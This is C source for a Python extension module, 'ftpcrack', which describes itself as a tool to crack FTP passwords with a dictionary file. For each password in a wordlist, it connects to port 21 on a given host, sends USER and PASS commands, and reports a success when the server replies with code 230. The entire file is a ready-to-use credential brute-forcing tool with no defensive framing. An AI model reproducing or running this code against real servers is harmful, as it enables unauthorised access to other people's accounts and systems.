/*
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; even without the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "include/Python.h"
#include "include/sys/types.h"
#include "include/sys/socket.h"
#include "include/netinet/in.h"
#include "include/netdb.h"

#define PORT 21
int send_msg(void* c_socket, char* msg);
int recv_msg(void* c_socket, char* recv_buff, size_t buff_size);
int check_status_code(char* msg);
static PyObject* FtpError;
char errorMsg[64];

static PyObject* ftpcrack_main(PyObject* self, PyObject* args){

	/*
		The main function. Takes the arguments
		passed and sets up the script for the
		actual cracking process.
	*/

	//Argument variable
	const char *hostname;
	char *username;
	char *diction;

	//Increase the python reference to return PyObject of "None"
	Py_INCREF(Py_None);

	//get args from the python program
	if(!PyArg_ParseTuple(args,"sss",&hostname,&username,&diction)){
		printf("Argument error");
		PyErr_SetString(FtpError, strerror(errno));
		return NULL; //send error to Python Interpreter
	}

	//init the variable needed for the program
	int c;
	char passBuff[128];
	char dataRecv[128];
	char statusCode[4];
	char userSendBuf[64];
	char passSendBuf[64];
	struct sockaddr_in serv_addr;
	struct hostent *server;
	FILE *fp;

	//handle processing for server hostname for socket config
	printf("Hostname: %s\n", hostname);
	server = gethostbyname(hostname);
	if(server == NULL){
		printf("Hostname Error\n");
		PyErr_SetString(FtpError, strerror(errno));
		return NULL;
	}

	//open dictionary file for reading
	if((fp = fopen(diction, "r")) == NULL){
		PyErr_SetString(FtpError, strerror(errno));
		return NULL;
	}

	//get individual password to try
	while(fgets(passBuff, sizeof(passBuff), (FILE*)fp) != NULL){

		//zero buffer and set the user and pass buffer
		memset(statusCode, 0, sizeof(statusCode));
		memset(userSendBuf, 0, sizeof(userSendBuf));
		memset(passSendBuf, 0, sizeof(passSendBuf));

		sprintf(userSendBuf, "USER %s\r\n", username);
		sprintf(passSendBuf, "PASS %s\r\n", passBuff);

		//handler for socket creation, configuration, connection and data transfer
		c = socket(AF_INET, SOCK_STREAM, 0);
		if(c < 0){
			PyErr_SetString(FtpError, strerror(errno));
			fclose(fp);
			return NULL;
		}

		//DEPRECATED: socket cconfig handling
		/*memset(&serv_addr, 0, sizeof(serv_addr));
		serv_addr.sin_family = AF_INET;
		memcpy(&serv_addr.sin_addr.s_addr, &server->h_addr, server->h_length);
		serv_addr.sin_port = htons(PORT);
		*/

		//UPDATED: socket config handling
		bzero((char*)&serv_addr, sizeof(serv_addr));
		serv_addr.sin_family = AF_INET;
		bcopy((char*)server->h_addr,
			 (char*)&serv_addr.sin_addr.s_addr,
			 server->h_length);
		serv_addr.sin_port = htons(PORT);

		//Connection handler
		if((connect(c, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0){
			printf("Connect Error\n");
			PyErr_SetString(FtpError, strerror(errno));
			fclose(fp);
			return NULL;
		}

		//Data handler to send username, password and termination commands
		printf("[*] Trying %s:%s", username, passBuff);
		if((recv_msg((void*)&c, dataRecv, sizeof(dataRecv))) < 0){
			fclose(fp);
			return NULL;
		}

		if((send_msg((void*)&c, userSendBuf)) < 0){
			fclose(fp);
			return NULL;
		}

		if((recv_msg((void*)&c, dataRecv, sizeof(dataRecv))) < 0){
			fclose(fp);
			return NULL;
		}

		if((send_msg((void*)&c, passSendBuf)) < 0){
			fclose(fp);
			return NULL;
		}

		if((recv_msg((void*)&c, statusCode, sizeof(statusCode))) < 0){
			fclose(fp);
			return NULL;
		}
		statusCode[3] = '\0';
		close(c);

		//compare status code with auth code
		if((strcmp("230", statusCode)) == 0){
			printf("[Success!] Password Found: %s", passBuff);
			break;
		}

	}

	//close file and return the PyObject "None"
	fclose(fp);
	return Py_None;

}

int send_msg(void* c_socket, char* msg){

	/*
		Function to send the passed buffer
		to the server. Then check for errors
		and report it to the function
	*/

	int s = *(int*)c_socket;
	if((send(s, msg, strlen(msg), 0)) < 0){
		PyErr_SetString(FtpError, strerror(errno));
		return 1;
	}

	return 0;

}

int recv_msg(void* c_socket, char* recv_buff, size_t buff_size){

	/*
		Function to recv message from the server
		and put it in the recv buffer. Then
		checks for a valid status code.
	*/

	int s = *(int*)c_socket;

	memset(recv_buff, 0, buff_size);
	if((recv(s, recv_buff, buff_size, 0)) < 0){
		PyErr_SetString(FtpError, strerror(errno));
		return 1;
	}

	if((check_status_code(recv_buff)) != 0){
		printf("%s\n", recv_buff);
		return 1;
	}

	return 0;

}

int check_status_code(char* msg){
	/*
		If an uncommon status code is sent back, this
		function will return 1 letting the function
		that called it to print the message that came
		with the status code, otherwise, it will return
		0 which will not print anything
	*/

	char status[3];
	bzero(status, sizeof(status));
	memmove(status,msg,3);

	if((strcmp(status,"230")) == 0){
		return 0;
	}else if((strcmp(status,"530")) == 0){
		return 0;
	}else if((strcmp(status,"331")) == 0){
		return 0;
	}else if((strcmp(status,"220")) == 0){
		return 0;
	}else{
		return 1;
	}

}

static PyMethodDef ftpcrack_methods[] = {

	//Create the method declaration to use the functions from python

	//Python Func Name		C Func Name				Argument count			Description (Optional)
	{"crack_pass",			ftpcrack_main,			METH_VARARGS,			NULL},
	{NULL, NULL, 0, NULL} 	//Ending Sentinel

};

static struct PyModuleDef ftpcrack_module = {
	PyModuleDef_HEAD_INIT,
	"ftpcrack",
	"Python module used to crack ftp passwords with a dictionary file",
	-1,
	ftpcrack_methods
};

PyMODINIT_FUNC PyInit_ftpcrack(void){

	//Init the module after everything has been compiled

	PyObject *m;
	m = PyModule_Create(&ftpcrack_module);
	if(m == NULL){
		return NULL;
	}

	return m;

}
